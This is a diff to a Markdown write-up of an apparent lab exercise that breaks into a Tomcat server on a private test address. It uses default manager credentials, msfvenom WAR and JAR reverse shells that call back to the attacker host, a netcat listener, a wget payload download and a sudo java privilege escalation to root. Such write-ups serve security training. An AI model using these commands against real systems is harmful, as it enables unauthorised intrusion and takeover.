@@ -21,7 +21,7 @@ some more code for example</pre>
 
 Then an nmap scan:
 
-	nmap -p- -A 192.168.56.110
+<pre>nmap -p- -A 192.168.56.110</pre>
 
 ![nmap](https://imgur.com/fqEpNx9.png)
 
@@ -33,7 +33,7 @@ Apache Tomcat is an application server designed to execute Java servlets and ren
 
 The "Manager App" section requires a username and password. The default credentials for Tomcat work (tomcat:tomcat).
 
-	192.168.56.110:8080/manager/html
+<pre>192.168.56.110:8080/manager/html</pre>
 
 The Web Application Manager is an opportunity to upload a reverse shell. I'll be using msfvenom to create a reverse shell. This is a good website on how to use msfvenom for reference:
 
@@ -41,7 +41,7 @@ The Web Application Manager is an opportunity to upload a reverse shell. I'll be
 
 The payload must be a war file, listening on port 4444 with my local adddress.
 
-	msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > fedai.war
+<pre>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > fedai.war</pre>
 
 This will be uploaded here:
 
@@ -49,12 +49,12 @@ This will be uploaded here:
 
 Before executing the payload, listen on port 4444 with netcat:
 
-	nc -nvlp 4444
+<pre>nc -nvlp 4444</pre>
 
 Now it must be executed, so we visit the path where it is kept, in my case /fedai. We now have a reverse shell. Uid is 'tomcat'.
 
-	id
-	python -c 'import pty;pty.spawn("/bin/bash")'
+<pre>id
+python -c 'import pty;pty.spawn("/bin/bash")'</pre>
 
 ![deployed](https://imgur.com/2hdSVjH.png)
 
@@ -63,7 +63,7 @@ Now it must be executed, so we visit the path where it is kept, in my case /feda
 
 Always check sudo priviliges to see how we can start escelating priviliges:
 
-	sudo -l
+<pre>sudo -l</pre>
    
 ![sudo l](https://imgur.com/50SztJT.png)
 
@@ -71,37 +71,36 @@ As demonstrated, the user tomcat can run commands here:	/usr/lib/jvm/java-1.8.0-
 
 We'll be creating another reverse shell payload on meterpreter in a java file format. Listening port will be 5555 with my local IP address again. The file will be downloaded on the victims pc so this file will be created under the apache web directory on my machine.
 
-	msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp lhost=192.168.56.101 lport=5555 > fedai.jar
+<pre>msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp lhost=192.168.56.101 lport=5555 > fedai.jar</pre>
 
 ![www](https://imgur.com/0IDSyUh.png)
 
 Start the apache2 service:
 
-	service apache2 start
+<pre>service apache2 start</pre>
 
 Go to the temp directory on the victims machine and transfer the payload over.
 
-	cd /tmp
-	wget http://192.168.56.101/fedai.jar
+<pre>cd /tmp
+wget http://192.168.56.101/fedai.jar</pre>
 
 ![wget](https://imgur.com/PmLq6W1.png)
-
 
 ### Root
 
 Before executing, we need to set up the meterpreter payload listener on metasploit:
 
-	msfconsole
-	use exploit/multi/handler
-	set payload java/meterpreter/reverse_tcp
-	set lport 5555
-	run
+<pre>msfconsole
+use exploit/multi/handler
+set payload java/meterpreter/reverse_tcp
+set lport 5555
+run</pre>
 
 ![meterpreter](https://imgur.com/UWIDebS.png)
 
 Let's execute this payload with the following command:
 
-	sudo java -jar fedai.jar
+<pre>sudo java -jar fedai.jar</pre>
 
 ![exe](https://imgur.com/6tya58T.png)
 
